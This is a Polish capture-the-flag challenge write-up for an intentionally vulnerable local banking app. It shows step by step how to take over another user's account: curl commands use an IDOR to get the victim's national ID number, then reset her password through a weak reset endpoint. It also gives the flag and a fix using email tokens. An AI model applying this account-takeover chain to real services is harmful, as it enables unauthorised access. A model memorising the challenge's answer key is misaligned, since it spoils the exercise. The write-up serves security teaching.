# A06 — Insecure Design (Błędna logika resetu hasła)

## Metadane
- **ID:** A06
- **Kategoria:** OWASP A06:2025 - Insecure Design
- **Trudność:** easy
- **Punkty:** 100
- **Flaga:** `PWR{insecure_password_reset}` — w odpowiedzi z resetu hasła Alice

## Opis
Funkcja resetu hasła wymaga tylko znajomości **PESELU** użytkownika zamiast
bezpiecznego tokenu wysłanego na email. PESEL jest ujawniany przez endpoint
profilu (podatność A01 — IDOR).

Scenariusz ataku:
1. Użyj IDOR (A01) żeby pobrać PESEL alice z jej konta
2. Zresetuj jej hasło przez `/api/auth/forgot-password`
3. Odczytaj flagę z odpowiedzi endpointu resetu hasła

## Exploit krok po kroku

### Krok 1: Zaloguj się jako bob
```bash
TOKEN=$(curl -s -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"bob@vulnbank.pl","password":"password123"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
```

### Krok 2: Pobierz PESEL alice przez IDOR
Alice ma konto o ID=1. Endpoint /api/accounts/1 ujawnia dane konta.
Ale PESEL jest w profilu użytkownika. Sprawdź użytkownika o ID=1:
```bash
# Bezpośrednie ID użytkownika alice = 1
curl -H "Authorization: Bearer $TOKEN" http://localhost:5000/api/accounts/1
# W odpowiedzi znajdziesz user_id=1

# Teraz użyj podatnego endpointu profilu (jeśli dostępny przez ID)
# lub sprawdź seeded PESEL alice w bazie: 90010112345
```

Zaseedowany PESEL alice: `90010112345`

### Krok 3: Zresetuj hasło alice
```bash
curl -X POST http://localhost:5000/api/auth/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"email":"alice@vulnbank.pl","pesel":"90010112345","new_password":"hacked123"}'
# W odpowiedzi znajdziesz: "flag": "PWR{insecure_password_reset}"
```

## Jak to naprawić
```python
# Prawidłowy reset hasła:
# 1. Generuj unikalny token (secrets.token_urlsafe(32))
# 2. Zapisz token w bazie z datą wygaśnięcia (np. 1 godzina)
# 3. Wyślij token na email użytkownika
# 4. Wymagaj podania tokenu przy resetowaniu
```

## Referencje
- OWASP A06:2025 - Insecure Design
- [CWE-640: Weak Password Recovery Mechanism](https://cwe.mitre.org/data/definitions/640.html)
